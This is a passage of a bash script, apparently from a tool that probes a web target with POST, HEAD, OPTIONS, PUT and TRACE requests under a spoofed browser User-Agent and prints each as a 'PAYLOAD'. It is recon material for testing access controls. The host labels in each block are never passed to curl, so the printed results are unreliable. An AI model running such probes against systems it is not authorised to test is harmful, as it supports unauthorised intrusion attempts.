	code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X POST)
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X POST\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "POST : localhost "
	code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X POST)
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X POST\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "POST : 192.168.1.1 "
	code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X POST)
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X POST\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"


	echo -n "HEAD : ${website_ip}"
	code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X HEAD)
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X HEAD\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "HEAD : 127.0.0.1"
	code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X HEAD)
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X HEAD\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "HEAD : *"
	code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X HEAD)
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X HEAD\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "HEAD : 8.8.8.8"
	code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X HEAD)
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X HEAD\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "HEAD : null"
	code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X HEAD)
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X HEAD\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "HEAD : 192.168.0.2"
	code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X HEAD)
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X HEAD\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "HEAD : 10.0.0.1"
	code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X HEAD)
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X HEAD\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "HEAD : 0.0.0.0"
	code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X HEAD)
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X HEAD\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "HEAD : localhost"
	code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X HEAD)
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X HEAD\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "HEAD : 192.168.1.1"
	code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X HEAD)
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X HEAD\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"


	echo -n "OPTIONS : ${website_ip} "
	code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X OPTIONS)
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X OPTIONS\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "OPTIONS : 127.0.0.1 "
	code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X OPTIONS)
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X OPTIONS\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "OPTIONS : * "
	code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X OPTIONS)
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X OPTIONS\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "OPTIONS : 8.8.8.8 "
	code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X OPTIONS)
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X OPTIONS\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "OPTIONS : null "
	code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X OPTIONS)
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X OPTIONS\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "OPTIONS : 192.168.0.2 "
	code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X OPTIONS)
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X OPTIONS\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "OPTIONS : 10.0.0.1 "
	code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X OPTIONS)
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X OPTIONS\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "OPTIONS : 0.0.0.0 "
	code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X OPTIONS)
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X OPTIONS\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "OPTIONS : localhost "
	code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X OPTIONS)
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X OPTIONS\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "OPTIONS : 192.168.1.1 "
	code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X OPTIONS)
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X OPTIONS\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"


	echo -n "PUT : ${website_ip} "
	code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X PUT)
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X PUT\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "PUT : 127.0.0.1 "
	code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X PUT)
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X PUT\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "PUT : * "
	code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X PUT)
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X PUT\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "PUT : 8.8.8.8 "
	code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X PUT)
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X PUT\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "PUT : null "
	code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X PUT)
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X PUT\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "PUT : 192.168.0.2 "
	code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X PUT)
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X PUT\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "PUT : 10.0.0.1 "
	code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X PUT)
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X PUT\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "PUT : 0.0.0.0 "
	code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X PUT)
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X PUT\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "PUT : localhost "
	code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X PUT)
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X PUT\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "PUT : 192.168.1.1 "
	code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X PUT)
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X PUT\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"


	echo -n "TRACE : ${website_ip} "
	code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X TRACE)
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X TRACE\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "TRACE : 127.0.0.1 "
	code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X TRACE)
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X TRACE\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "TRACE : * "
	code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X TRACE)
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X TRACE\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "TRACE : 8.8.8.8 "
	code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X TRACE)
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X TRACE\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "TRACE : null "
	code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X TRACE)
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X TRACE\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "TRACE : 192.168.0.2 "
	code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X TRACE)
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X TRACE\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "TRACE : 10.0.0.1 "
	code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X TRACE)
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X TRACE\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "TRACE : 0.0.0.0 "
	code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X TRACE)
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X TRACE\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "TRACE : localhost "
	code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X TRACE)
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X TRACE\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "TRACE : 192.168.1.1 "
	code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X TRACE)
	
